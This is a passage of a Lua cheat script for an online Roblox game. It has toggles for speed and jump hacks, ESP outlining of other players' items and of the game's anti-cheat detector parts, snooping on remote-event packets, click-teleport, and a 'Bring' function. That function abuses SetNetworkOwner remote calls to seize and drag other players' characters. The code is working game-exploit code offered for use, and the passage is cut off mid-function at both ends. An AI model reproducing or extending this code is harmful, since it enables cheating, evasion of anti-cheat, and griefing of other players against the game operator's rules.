    Min = 0,
    Max = 500,
    Default = 16,
    Rounding = 1,
    Callback = function(Value)
        Config.WalkspeedCont = Value
    end
})

SettingsDou:AddSlider("JumppowerCon", {
    Text = "Jump Powner",
    Min = 0,
    Max = 500,
    Default = 50,
    Rounding = 1,
    Callback = function(Value)
        Config.JumpPownerCont = Value
    end
})

Antikickesp:AddToggle("Antesp", {
    Text = "Anti-Kick ESP",
    Default = false,
    Callback = function(v)
        if v then
            for _,pl in service.Players:GetPlayers() do
                if pl~=plr then 
                    for i,v in workspace[pl.Name.."SpawnedInToys"]:GetChildren() do
                        if v:FindFirstChild("StickyPart") then
                            local high = Instance.new("Highlight", v)
                            high.Adornee = v
                            if v.StickyPart.StickyWeld.Part1 then
                                high.FillColor = Color3.fromRGB(192, 173, 0)
                            else
                                high.FillColor = Color3.fromRGB(0, 194, 0)
                            end
                            v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(192, 173, 0)
                                else
                                    high.FillColor = Color3.fromRGB(0, 194, 0)
                                end
                            end)
                        end
                    end
                    Config.Contuuti["antikickesp"..pl.Name] = workspace[pl.Name.."SpawnedInToys"].ChildAdded:Connect(function(v)
                        task.wait(0.4)
                        if v:FindFirstChild("StickyPart") then
                            local high = Instance.new("Highlight", v)
                            high.Adornee = v
                            if v.StickyPart.StickyWeld.Part1 then
                                high.FillColor = Color3.fromRGB(192, 173, 0)
                            else
                                high.FillColor = Color3.fromRGB(0, 194, 0)
                            end
                            v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(192, 173, 0)
                                else
                                    high.FillColor = Color3.fromRGB(0, 194, 0)
                                end
                            end)
                        end
                    end)
                end
            end
        else
            for i,v in service.Players:GetPlayers() do
                if v~=plr then
                    if Config.Contuuti["antikickesp"..v.Name] then Config.Contuuti["antikickesp"..v.Name]:Disconnect() Config.Contuuti["antikickesp"..v.Name] = nil end
                    for i,v in workspace[v.Name.."SpawnedInToys"]:GetChildren() do
                        if v:FindFirstChild("StickyPart") then
                            if v.Parent:FindFirstChild("Highlight") then v.Parent.Highlight:Destroy() end
                        end
                    end
                end
            end
        end
    end
})

PCES:AddToggle("PCLD", {
    Text = "PCLD",
    Default = false,
    Callback = function(Value)
        Config.PCLDToggle = Value
        local partname = {
            "partesp",
            "playercharacterlocationdetector"
        }
        if Config.PCLDToggle then
            task.spawn(function()
                local descendants = workspace:GetDescendants()
                local batchSize = 1000 
                for i, obj in ipairs(descendants) do
                    if not Config.PCLDToggle then break end 
                    local isTargetObj = false
                    if obj:IsA("BasePart") then
                        local lowerName = string.lower(obj.Name)
                        for _, name in ipairs(partname) do
                            if lowerName == string.lower(name) then
                                isTargetObj = true
                                break
                            end
                        end
                    end
                    if isTargetObj then
                        if not Config.PCLDBOX[obj] then
                            local container = Instance.new("Folder")
                            container.Name = "ESP_Container"
                            local lineBox = Instance.new("SelectionBox")
                            lineBox.Name = "LineBox"
                            lineBox.Adornee = obj
                            lineBox.LineThickness = 0.01
                            lineBox.Color3 = Config.PCLDLine
                            lineBox.SurfaceColor3 = Config.PCLDSurface
                            lineBox.SurfaceTransparency = 0.95
                            lineBox.Transparency = 0
                            lineBox.Parent = container
                            local fillBox = Instance.new("BoxHandleAdornment")
                            fillBox.Name = "FillBox"
                            fillBox.Adornee = obj
                            fillBox.Size = obj.Size
                            fillBox.Color3 = Config.PCLDFill
                            fillBox.Transparency = 0.9
                            fillBox.AlwaysOnTop = true
                            fillBox.ZIndex = 5
                            fillBox.Parent = container
                            container.Parent = game:GetService("CoreGui")
                            Config.PCLDBOX[obj] = container
                            obj.AncestryChanged:Connect(function(_, parent)
                                if not parent and Config.PCLDBOX[obj] then
                                    Config.PCLDBOX[obj]:Destroy()
                                    Config.PCLDBOX[obj] = nil
                                end
                            end)
                        end
                    end
                    if i % batchSize == 0 then
                        task.wait()
                    end
                end
            end)
            Config.PCLDCONN = workspace.DescendantAdded:Connect(function(obj)
                local isTargetObj = false
                if obj:IsA("BasePart") then
                    local lowerName = string.lower(obj.Name)
                    for _, name in ipairs(partname) do
                        if lowerName == string.lower(name) then
                            isTargetObj = true
                            break
                        end
                    end
                end
                if isTargetObj then
                    task.wait(0.1) 
                    if Config.PCLDToggle and obj:IsDescendantOf(workspace) then
                        if not Config.PCLDBOX[obj] then
                            local container = Instance.new("Folder")
                            container.Name = "ESP_Container"
                            local lineBox = Instance.new("SelectionBox")
                            lineBox.Name = "LineBox"
                            lineBox.Adornee = obj
                            lineBox.LineThickness = 0.01
                            lineBox.Color3 = Config.PCLDLine
                            lineBox.SurfaceColor3 = Config.PCLDSurface
                            lineBox.SurfaceTransparency = 0.95
                            lineBox.Transparency = 0
                            lineBox.Parent = container
                            local fillBox = Instance.new("BoxHandleAdornment")
                            fillBox.Name = "FillBox"
                            fillBox.Adornee = obj
                            fillBox.Size = obj.Size
                            fillBox.Color3 = Config.PCLDFill
                            fillBox.Transparency = 0.9
                            fillBox.AlwaysOnTop = true
                            fillBox.ZIndex = 5
                            fillBox.Parent = container
                            container.Parent = game:GetService("CoreGui")
                            Config.PCLDBOX[obj] = container
                            obj.AncestryChanged:Connect(function(_, parent)
                                if not parent and Config.PCLDBOX[obj] then
                                    Config.PCLDBOX[obj]:Destroy()
                                    Config.PCLDBOX[obj] = nil
                                end
                            end)
                        end
                    end
                end
            end)
        else
            if Config.PCLDCONN then
                Config.PCLDCONN:Disconnect()
                Config.PCLDCONN = nil
            end
            for obj, container in pairs(Config.PCLDBOX) do
                if container then
                    container:Destroy()
                end
            end
            Config.PCLDBOX = {}
        end
    end
})

PCES:AddLabel("PCLD Line Color"):AddColorPicker("pcld1", {
    Default = Color3.fromRGB(0, 255, 255),
    Title = "PCLD Line Color",
    Callback = function(Value)
        Config.PCLDLine = Value
        for _, container in pairs(Config.PCLDBOX or {}) do
            if container and container:FindFirstChild("LineBox") then
                container.LineBox.Color3 = Value
            end
        end
    end
})

PCES:AddLabel("PCLD Surface Color"):AddColorPicker("pcld2", {
    Default = Color3.fromRGB(0, 100, 255),
    Title = "PCLD Surface Color",
    Callback = function(Value)
        Config.PCLDSurface = Value
        for _, container in pairs(Config.PCLDBOX or {}) do
            if container and container:FindFirstChild("LineBox") then
                container.LineBox.SurfaceColor3 = Value
            end
        end
    end
})

PCES:AddLabel("PCLD Fill Color"):AddColorPicker("pcld3", {
    Default = Color3.fromRGB(0, 0, 255),
    Title = "PCLD Fill Color",
    Callback = function(Value)
        Config.PCLDFill = Value
        for _, container in pairs(Config.PCLDBOX or {}) do
            if container and container:FindFirstChild("FillBox") then
                container.FillBox.Color3 = Value
            end
        end
    end
})

BL:AddToggle("blesp", {
    Text = "BlackHole (ESP)",
    Default = false,
    Callback = function(Value)
        Config.blackHoleESP = Value
        if Value then
            for _, obj in ipairs(service.Workspace:GetChildren()) do
                if obj.Name == "BlackHoleKick" then
                    if not Config.BlackholeSelectionB[obj] then
                        local selectionBox = Instance.new("SelectionBox")
                        selectionBox.Adornee = obj
                        selectionBox.LineThickness = 0.05
                        selectionBox.Color3 = Color3.fromRGB(0, 191, 255)
                        selectionBox.Parent = obj
                        Config.BlackholeSelectionB[obj] = selectionBox
                        local holePart = obj:FindFirstChild("Hole")
                        if holePart and holePart:IsA("BasePart") then
                            local billboardGui = holePart:FindFirstChildOfClass("BillboardGui")
                            if billboardGui then
                                billboardGui.AlwaysOnTop = true
                            end
                            local localChar = GetCharacter()
                            if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                                local localHrp = localChar.HumanoidRootPart
                                local holeAttachment = Instance.new("Attachment")
                                holeAttachment.Parent = holePart
                                local localAttachment = Instance.new("Attachment")
                                localAttachment.Parent = localHrp
                                local beam = Instance.new("Beam")
                                beam.Attachment0 = localAttachment
                                beam.Attachment1 = holeAttachment
                                beam.Color = ColorSequence.new(Color3.fromRGB(0, 191, 255))
                                beam.Width0 = 0.1
                                beam.Width1 = 0.1
                                beam.Parent = holePart
                                Config.BlackholeBeam[obj] = {
                                    beam = beam,
                                    holeAttachment = holeAttachment,
                                    localAttachment = localAttachment
                                }
                            end
                        end
                    end
                end
            end
            if Config.BlackHoleConnection then Config.BlackHoleConnection:Disconnect() end
            Config.BlackHoleConnection = service.Workspace.ChildAdded:Connect(function(child)
                if Config.blackHoleESP and child.Name == "BlackHoleKick" then
                    if not Config.BlackholeSelectionB[child] then
                        local selectionBox = Instance.new("SelectionBox")
                        selectionBox.Adornee = child
                        selectionBox.LineThickness = 0.05
                        selectionBox.Color3 = Color3.fromRGB(0, 191, 255)
                        selectionBox.Parent = child
                        Config.BlackholeSelectionB[child] = selectionBox
                        local holePart = child:FindFirstChild("Hole")
                        if holePart and holePart:IsA("BasePart") then
                            local billboardGui = holePart:FindFirstChildOfClass("BillboardGui")
                            if billboardGui then
                                billboardGui.AlwaysOnTop = true
                            end
                            local localChar = GetCharacter()
                            if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                                local localHrp = localChar.HumanoidRootPart
                                local holeAttachment = Instance.new("Attachment")
                                holeAttachment.Parent = holePart
                                local localAttachment = Instance.new("Attachment")
                                localAttachment.Parent = localHrp
                                local beam = Instance.new("Beam")
                                beam.Attachment0 = localAttachment
                                beam.Attachment1 = holeAttachment
                                beam.Color = ColorSequence.new(Color3.fromRGB(0, 191, 255))
                                beam.Width0 = 0.1
                                beam.Width1 = 0.1
                                beam.Parent = holePart
                                Config.BlackholeBeam[child] = {
                                    beam = beam,
                                    holeAttachment = holeAttachment,
                                    localAttachment = localAttachment
                                }
                            end
                        end
                    end
                end
            end)
        else
            if Config.BlackHoleConnection then
                Config.BlackHoleConnection:Disconnect()
                Config.BlackHoleConnection = nil
            end
            for blackHole in pairs(Config.BlackholeSelectionB) do
                if Config.BlackholeSelectionB[blackHole] then
                    Config.BlackholeSelectionB[blackHole]:Destroy()
                    Config.BlackholeSelectionB[blackHole] = nil
                end
                
                if Config.BlackholeBeam[blackHole] then
                    if Config.BlackholeBeam[blackHole].beam then Config.BlackholeBeam[blackHole].beam:Destroy() end
                    if Config.BlackholeBeam[blackHole].holeAttachment then Config.BlackholeBeam[blackHole].holeAttachment:Destroy() end
                    if Config.BlackholeBeam[blackHole].localAttachment then Config.BlackholeBeam[blackHole].localAttachment:Destroy() end
                    Config.BlackholeBeam[blackHole] = nil
                end
            end
        end
    end
})

PlayersNotify:AddToggle("JoinNotify", {
    Text = "Join",
    Default = false,
    Callback = function(Value)
        Config.JoinNotify = Value
    end    
})

PlayersNotify:AddToggle("LeaveNotify", {
    Text = "Leave",
    Default = false,
    Callback = function(Value)
        Config.LeaveNotify = Value
    end    
})

PackBl:AddToggle("DetectPack", {
    Text = "Detect packets",
    Default = false,
    Callback = function(Value)
        if Value then
            if Config.PacketCon and #Config.PacketCon > 0 then return end
            Config.PacketCon = Config.PacketCon or {}

            local processEvent = function(eventType, remoteName, ...)
                local args = {...}
                local totalBytes = 0
                for _, v in ipairs(args) do
                    if typeof(v) == "string" then
                        totalBytes += #v
                    end
                end

                if totalBytes < Config.byte_thres then return end
                if tick() - (Config.lastPacketNotify or 0) < Config.PacketCooldown then return end
                Config.lastPacketNotify = tick()

                local sender = nil
                for _, v in ipairs(args) do
                    if typeof(v) == "Instance" then
                        if v:IsA("Player") then
                            sender = v
                            break
                        elseif v:IsA("Model") then
                            local plr = Players:GetPlayerFromCharacter(v)
                            if plr then sender = plr; break end
                        elseif v:IsA("BasePart") or v:IsA("Tool") then
                            local model = v:FindFirstAncestorOfClass("Model")
                            if model then
                                local plr = Players:GetPlayerFromCharacter(model)
                                if plr then sender = plr; break end
                            end
                        end
                    end
                end
                sender = sender or LocalPlayer

                local senderName = sender.DisplayName
                if sender == LocalPlayer then
                    senderName = senderName .. " (You)"
                end

                local mbSize = totalBytes / (1024 * 1024)
                local seen = {}
                local summary = {}

                for _, v in ipairs(args) do
                    local key
                    local t = typeof(v)
                    if t == "string" then
                        local str = v
                        if #str > 80 then
                            str = str:sub(1, 80) .. "... (+" .. (#str - 80) .. " chars)"
                        end
                        key = "str:" .. str
                    elseif t == "Instance" then
                        key = "inst:" .. v.ClassName .. "(" .. v.Name .. ")"
                    elseif t == "table" then
                        local preview = {}
                        local count = 0
                        for _, tv in pairs(v) do
                            count += 1
                            if count <= 5 then
                                table.insert(preview, tostring(tv))
                            end
                        end
                        key = "tbl:table[" .. count .. "] { " .. table.concat(preview, ", ") .. " ... }"
                    else
                        key = t .. ":" .. tostring(v)
                    end
                    seen[key] = (seen[key] or 0) + 1
                end

                for k, count in pairs(seen) do
                    if count > 1 then
                        table.insert(summary, k .. " x" .. count)
                    else
                        table.insert(summary, k)
                    end
                end

                Library:Notify({
                    Title = string.format("[%s] %s", eventType, remoteName),
                    Description = string.format("Player: %s\nSize: %.3f MB\nArgs:\n%s", senderName, mbSize, table.concat(summary, "\n")),
                    Duration = 4
                })
            end

            local grabRemote = service.ReplicatedStorage.GrabEvents:WaitForChild("ExtendGrabLine", 5)
            if grabRemote then
                table.insert(Config.PacketCon, grabRemote.OnClientEvent:Connect(function(...)
                    processEvent("Grab", "ExtendGrabLine", ...)
                end))
            end

            local checkAndConnectBlob = function(inst)
                if inst:IsA("RemoteEvent") and inst.Name == "RelayClientAnimation" and inst.Parent and inst.Parent.Name == "BlobmanAnimations" then
                    local pName = inst.Parent.Parent and inst.Parent.Parent.Name or "Unknown"
                    table.insert(Config.PacketCon, inst.OnClientEvent:Connect(function(...)
                        processEvent("Blob", pName, ...)
                    end))
                end
            end

            for _, desc in ipairs(workspace:GetDescendants()) do
                checkAndConnectBlob(desc)
            end

            table.insert(Config.PacketCon, workspace.DescendantAdded:Connect(function(desc)
                checkAndConnectBlob(desc)
            end))
        else
            if Config.PacketCon then
                for _, conn in ipairs(Config.PacketCon) do
                    pcall(function() conn:Disconnect() end)
                end
                Config.PacketCon = {}
            end
        end
    end
})

PackBl:AddToggle("KickNotify", {
    Text = "BlackHoleKick",
    Default = false,
    Callback = function(Value)
        Config.KickNotify = Value
        if Value then
            if not Config.KickConnection then
                Config.KickConnection = service.Workspace.ChildAdded:Connect(function(obj)
                    if obj.Name ~= "BlackHoleKick" then return end
                    task.wait(0.05)
                    local pos = obj:IsA("BasePart") and obj.Position or (obj:IsA("Model") and obj:GetPivot().Position)
                    if not pos then return end
                    local targetPlr, minDist = nil, math.huge
                    for _, plr in ipairs(service.Players:GetPlayers()) do
                        if plr ~= localPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                            local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
                            if dist < minDist then
                                minDist = dist
                                targetPlr = plr
                            end
                        end
                    end
                    if targetPlr then
                        NotifyAll(targetPlr, "Kick")
                    end
                end)
            end
        else
            if Config.KickConnection then
                Config.KickConnection:Disconnect()
                Config.KickConnection = nil
            end
        end
    end    
})

Playa:AddDropdown("TPmode", {
    Text = "TP Mode",
    Default = "ClickTP",
    Values = {"ClickTP", "ClickTP (Hold)"},
    Callback = function(Value)
        Config.TPMode = Value
        Config.holdtoggletp = false
        if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
    end
})

Playa:AddToggle("ClickTPZ", {
    Text = "Click TP (Z)",
    Default = false,
    Callback = function(Value)
        Config.ClickTPfutuu = Value
        local isMobile = service.UserInputService.TouchEnabled
        if Config.TPZcon then Config.TPZcon:Disconnect(); Config.TPZcon = nil end
        if Config.TPZconall then Config.TPZconall:Disconnect(); Config.TPZconall = nil end
        if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
        if Config.MobileTPDownCon then Config.MobileTPDownCon:Disconnect(); Config.MobileTPDownCon = nil end
        if Config.MobileTPUpCon then Config.MobileTPUpCon:Disconnect(); Config.MobileTPUpCon = nil end
        if Config.MobileTPLeaveCon then Config.MobileTPLeaveCon:Disconnect(); Config.MobileTPLeaveCon = nil end
        if Config.MobileTPClickCon then Config.MobileTPClickCon:Disconnect(); Config.MobileTPClickCon = nil end
        Config.holdtoggletp = false
        if Config.ClickTPfutuu then
            tpGui.Parent = PlayerGui
            tpButton.Visible = true
            tpButton.Active = true
            tpLabel.Visible = true
        else
            tpButton.Visible = false
            tpButton.Active = false
            tpLabel.Visible = false
        end
        if Config.ClickTPfutuu then
            if isMobile then
                Config.MobileTPDownCon = tpButton.MouseButton1Down:Connect(function()
                    if Config.TPMode == "ClickTP (Hold)" and Config.ClickTPfutuu then
                        Config.holdtoggletp = true
                        if not Config.TPZholdCn then
                            Config.TPZholdCn = service.RunService.Heartbeat:Connect(function()
                                if Config.holdtoggletp and Config.ClickTPfutuu then
                                    local CharacterTP = Config.TPZContro or localPlayer.Character
                                    if CharacterTP then
                                        local originPartName = Config.TPZContro and "Head" or (localPlayer.Character and "CamPart" or nil)
                                        if originPartName and CharacterTP:FindFirstChild(originPartName) then
                                            local hitPart, hitPosition = service.Workspace:FindPartOnRayWithIgnoreList(
                                                Ray.new(CharacterTP[originPartName].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000),
                                                { CharacterTP }
                                            )
                                            if hitPart and CharacterTP:FindFirstChild("HumanoidRootPart") then
                                                CharacterTP.HumanoidRootPart.CFrame = CFrame.new(hitPosition.X, hitPosition.Y + 3, hitPosition.Z)
                                            end
                                        end
                                    end
                                else
                                    if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
                                end
                            end)
                        end
                    end
                end)
                Config.MobileTPUpCon = tpButton.MouseButton1Up:Connect(function()
                    if Config.TPMode == "ClickTP (Hold)" then
                        Config.holdtoggletp = false
                        if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
                    end
                end)
                Config.MobileTPLeaveCon = tpButton.MouseLeave:Connect(function()
                    if Config.TPMode == "ClickTP (Hold)" then
                        Config.holdtoggletp = false
                        if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
                    end
                end)
                Config.MobileTPClickCon = tpButton.MouseButton1Click:Connect(function()
                    if Config.TPMode == "ClickTP" and Config.ClickTPfutuu then
                        local CharacterTP = Config.TPZContro or localPlayer.Character
                        if CharacterTP then
                            local originPartName = Config.TPZContro and "Head" or (localPlayer.Character and "CamPart" or nil)
                            if originPartName and CharacterTP:FindFirstChild(originPartName) then
                                local hitPart, hitPosition = service.Workspace:FindPartOnRayWithIgnoreList(
                                    Ray.new(CharacterTP[originPartName].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000),
                                    { CharacterTP }
                                )
                                if hitPart and CharacterTP:FindFirstChild("HumanoidRootPart") then
                                    CharacterTP.HumanoidRootPart.CFrame = CFrame.new(hitPosition.X, hitPosition.Y + 3, hitPosition.Z)
                                end
                            end
                        end
                    end
                end)
            else
                Config.TPZcon = service.UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if gameProcessed then return end
                    if input.KeyCode == Config.ClickTPKey and Config.ClickTPfutuu then
                        if Config.TPMode == "ClickTP" then
                            local CharacterTP = Config.TPZContro or localPlayer.Character
                            if CharacterTP then
                                local originPartName = Config.TPZContro and "Head" or (localPlayer.Character and "CamPart" or nil)
                                if originPartName and CharacterTP:FindFirstChild(originPartName) then
                                    local hitPart, hitPosition = service.Workspace:FindPartOnRayWithIgnoreList(
                                        Ray.new(CharacterTP[originPartName].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000),
                                        { CharacterTP }
                                    )
                                    if hitPart and CharacterTP:FindFirstChild("HumanoidRootPart") then
                                        CharacterTP.HumanoidRootPart.CFrame = CFrame.new(hitPosition.X, hitPosition.Y + 3, hitPosition.Z)
                                    end
                                end
                            end
                        elseif Config.TPMode == "ClickTP (Hold)" then
                            Config.holdtoggletp = true
                            if not Config.TPZholdCn then
                                Config.TPZholdCn = service.RunService.Heartbeat:Connect(function()
                                    if Config.holdtoggletp and Config.ClickTPfutuu then
                                        local CharacterTP = Config.TPZContro or localPlayer.Character
                                        if CharacterTP then
                                            local originPartName = Config.TPZContro and "Head" or (localPlayer.Character and "CamPart" or nil)
                                            if originPartName and CharacterTP:FindFirstChild(originPartName) then
                                                local hitPart, hitPosition = service.Workspace:FindPartOnRayWithIgnoreList(
                                                    Ray.new(CharacterTP[originPartName].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000),
                                                    { CharacterTP }
                                                )
                                                if hitPart and CharacterTP:FindFirstChild("HumanoidRootPart") then
                                                    CharacterTP.HumanoidRootPart.CFrame = CFrame.new(hitPosition.X, hitPosition.Y + 3, hitPosition.Z)
                                                end
                                            end
                                        end
                                    else
                                        if Config.TPZholdCn then Config.TPZholdCn:Disconnect(); Config.TPZholdCn = nil end
                                    end
                                end)
                            end
                        end
                    end
                end)
                Config.TPZconall = service.UserInputService.InputEnded:Connect(function(input, gameProcessed)
                    if input.KeyCode == Config.ClickTPKey then
                        Config.holdtoggletp = false
                        if Config.TPZholdCn then
                            Config.TPZholdCn:Disconnect()
                            Config.TPZholdCn = nil
                        end
                    end
                end)
            end
        end
    end
})

Playa:AddLabel("Click TP Key"):AddKeyPicker("ClickTPKeybind", {
    Default = "Z",
    Mode = "Press",
    Modes = { "Press" },
    Text = "Click TP Key",
    Callback = function(State) end,
    ChangedCallback = function(KeyCode, Modifiers)
        if typeof(KeyCode) == "EnumItem" and KeyCode.EnumType == Enum.KeyCode then
            Config.ClickTPKey = KeyCode
            if Config.ClickTPfutuu and Playa.Toggles and Playa.Toggles.ClickTPZ then
                Playa.Toggles.ClickTPZ:SetValue(true)
            end
        end
    end,
})

Playa:AddToggle("BringG", {
    Text = "Bring",
    Default = false,
    Callback = function(Value)
        Config.BringToggleValue = Value
        if not BringToggleData then
            BringToggleData = { KeyConnection = nil, ButtonConnection = nil }
        end
        local data = BringToggleData
        if data.KeyConnection then data.KeyConnection:Disconnect(); data.KeyConnection = nil end
        if data.ButtonConnection then data.ButtonConnection:Disconnect(); data.ButtonConnection = nil end
        bringGui.Parent = PlayerGui

        if Value then
            bringButton.Visible = true
            bringButton.Active = true
            bringLabel.Visible = true       -- ★ ラベル表示

            local isTouchDevice = service.UserInputService.TouchEnabled
            if isTouchDevice then
                data.ButtonConnection = bringButton.MouseButton1Click:Connect(function()
                    task.spawn(function()
                        local playerGuiObj = localPlayer:FindFirstChild("PlayerGui")
                        if not playerGuiObj then return end
                        local crosshairs = playerGuiObj:FindFirstChild("Crosshairs")
                        if not crosshairs then return end
                        local crosshairsFrame = crosshairs:FindFirstChild("CrosshairsFrame")
                        if not crosshairsFrame then return end
                        local camera = service.Workspace.CurrentCamera
                        local rayOrigin = camera.CFrame.Position
                        local rayDirection = camera.CFrame.LookVector * 1000
                        local raycastParams = RaycastParams.new()
                        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                        raycastParams.FilterDescendantsInstances = {localPlayer.Character}
                        local rayResult = service.Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                        if not rayResult then return end
                        local targetPart = rayResult.Instance
                        if not targetPart then return end
                        local ignoredNames = { Map = true, Plots = true, Waypoints = true, Slots = true }
                        local current = targetPart
                        while current and current ~= service.Workspace do
                            if ignoredNames[current.Name] then return end
                            current = current.Parent
                        end
                        local char = GetCharacter()
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if not hrp then return end
                        local characterModel = targetPart:FindFirstAncestorWhichIsA("Model")
                        local hasHumanoid = false
                        if characterModel then
                            local humanoid = characterModel:FindFirstChildOfClass("Humanoid")
                            if humanoid then hasHumanoid = true end
                        end
                        if characterModel and hasHumanoid then
                            local playerModel = characterModel
                            local torso = playerModel:FindFirstChild("Torso") or playerModel:FindFirstChild("UpperTorso")
                            local head = playerModel:FindFirstChild("Head")
                            if not torso or not hrp then return end
                            local distance = (hrp.Position - torso.Position).Magnitude
                            if distance > 99999 then return end
                            if torso and torso.Parent then
                                Struggle:FireServer()
                                local stop = false
                                task.spawn(function()
                                    repeat
                                        task.wait(0.01)
                                        local ownerVal = torso:FindFirstChild("PartOwner")
                                        if ownerVal and ownerVal.Value == localPlayer.Name then
                                            stop = true
                                            break
                                        end
                                    until stop
                                end)
                                local initialDist = (hrp.Position - torso.Position).Magnitude
                                if initialDist <= 24 then
                                    for i = 1, 12 do
                                        if stop then break end
                                        SetNetworkOwner:FireServer(torso, torso.CFrame)
                                        task.wait(0.02)
                                    end
                                    task.spawn(function()
                                        repeat task.wait() until (head and (not head:IsGrounded() and head.AssemblyRootPart.ReceiveAge == 0)) or not playerModel
                                        if hrp and torso then
                                            torso.CFrame = hrp.CFrame * CFrame.new(0, 0, -4)
                                            local targetHRP = playerModel:FindFirstChild("HumanoidRootPart")
                                            if targetHRP then targetHRP.AssemblyLinearVelocity = Vector3.zero end
                                        end
                                    end)
                                else
                                    local origPos = hrp.CFrame
                                    task.wait(0.03)
                                    for i = 1, 18 do
                                        if stop then break end
                                        local targetPos = torso.Position
                                        local vel = torso.AssemblyLinearVelocity
                                        if vel.Magnitude >= 2 then
                                            local pingMs = service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                                            local predTime = (pingMs / 1000) * 0.8 + 0.05
                                            local gravity = Vector3.new(0, -service.Workspace.Gravity * 0.5, 0)
                                            targetPos = torso.Position + (vel * predTime) + (gravity * predTime * predTime * 0.5)
                                        end
                                        hrp.CFrame = CFrame.new(targetPos) * CFrame.new(0, 10, 0)
                                        task.wait(0.01)
                                        SetNetworkOwner:FireServer(torso, torso.CFrame)
                                    end
                                    task.wait(0.01)
                                    task.spawn(function()
                                        repeat task.wait() until (head and (not head:IsGrounded() and head.AssemblyRootPart.ReceiveAge == 0)) or not playerModel
                                        if hrp and torso then
                                            torso.CFrame = hrp.CFrame * CFrame.new(0, 0, -4)
                                            local targetHRP = playerModel:FindFirstChild("HumanoidRootPart")
                                            if targetHRP then targetHRP.AssemblyLinearVelocity = Vector3.zero end
                                        end
                                    end)
                                    hrp.CFrame = origPos
                                end
                                stop = true
                                DestroyGrabLine:FireServer(torso)
                            end
                        else
                            if targetPart and targetPart.Parent then
                                local distance = (hrp.Position - targetPart.Position).Magnitude
                                if distance > 99999 then return end
                                Struggle:FireServer()
                                local stop = false
                                task.spawn(function()
                                    repeat
                                        task.wait(0.01)
                                        local ownerVal = targetPart:FindFirstChild("PartOwner")
                                        if ownerVal and ownerVal.Value == localPlayer.Name then
                                            stop = true
                                            break
                                        end
                                    until stop
                                end)
                                local initialDist = (hrp.Position - targetPart.Position).Magnitude
                                if initialDist <= 29 then
                                    for i = 1, 12 do
                                        if stop then break end
                                        SetNetworkOwner:FireServer(targetPart, targetPart.CFrame)
                                        task.wait(0.02)
                                    end
                                else
                                    local origPos = hrp.CFrame
                                    task.wait(0.03)
                                    for i = 1, 18 do
                                        if stop then break end
                                        local targetPos = targetPart.Position
                                        local vel = targetPart.AssemblyLinearVelocity
                                        if vel.Magnitude >= 2 then
                                            local pingMs = service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                                            local predTime = (pingMs / 1000) * 0.8 + 0.05
                                            local gravity = Vector3.new(0, -service.Workspace.Gravity * 0.5, 0)
                                            targetPos = targetPart.Position + (vel * predTime) + (gravity * predTime * predTime * 0.5)
                                        end
                                        hrp.CFrame = CFrame.new(targetPos) * CFrame.new(0, 10, 0)
                                        task.wait(0.01)
                                        SetNetworkOwner:FireServer(targetPart, targetPart.CFrame)
                                    end
                                    task.wait(0.01)
                                    hrp.CFrame = origPos
                                end
                                stop = true
                                repeat task.wait() until (function()
                                    local ownerVal = targetPart:FindFirstChild("PartOwner")
                                    return ownerVal and ownerVal.Value == localPlayer.Name
                                end)()
                                if hrp and targetPart.AssemblyRootPart then
                                    targetPart.AssemblyRootPart.CFrame = hrp.CFrame + (hrp.CFrame.LookVector * 5)
                                    DestroyGrabLine:FireServer(targetPart.AssemblyRootPart)
                                end
                            end
                        end
                    end)
                end)
            else
                data.KeyConnection = service.UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if not gameProcessed and input.KeyCode == Config.BringKey then
                        task.spawn(function()
                            local playerGuiObj = localPlayer:FindFirstChild("PlayerGui")
                            if not playerGuiObj then return end
                            local crosshairs = playerGuiObj:FindFirstChild("Crosshairs")
                            if not crosshairs then return end
                            local crosshairsFrame = crosshairs:FindFirstChild("CrosshairsFrame")
                            if not crosshairsFrame then return end
                            local camera = service.Workspace.CurrentCamera
                            local rayOrigin = camera.CFrame.Position
                            local rayDirection = camera.CFrame.LookVector * 1000
                            local raycastParams = RaycastParams.new()
                            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                            raycastParams.FilterDescendantsInstances = {localPlayer.Character}
                            local rayResult = service.Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                            if not rayResult then return end
                            local targetPart = rayResult.Instance
                            if not targetPart then return end
                            local ignoredNames = { Map = true, Plots = true, Waypoints = true, Slots = true }
                            local current = targetPart
                            while current and current ~= service.Workspace do
                                if ignoredNames[current.Name] then return end
                                current = current.Parent
                            end
                            local char = GetCharacter()
                            local hrp = char and char:FindFirstChild("HumanoidRootPart")
                            if not hrp then return end
                            local characterModel = targetPart:FindFirstAncestorWhichIsA("Model")
                            local hasHumanoid = false
                            if characterModel then
                                local humanoid = characterModel:FindFirstChildOfClass("Humanoid")
                                if humanoid then hasHumanoid = true end
                            end
                            if characterModel and hasHumanoid then
                                local playerModel = characterModel
                                local torso = playerModel:FindFirstChild("Torso") or playerModel:FindFirstChild("UpperTorso")
                                local head = playerModel:FindFirstChild("Head")
                                if not torso or not hrp then return end
                                local distance = (hrp.Position - torso.Position).Magnitude
                                if distance > 99999 then return end
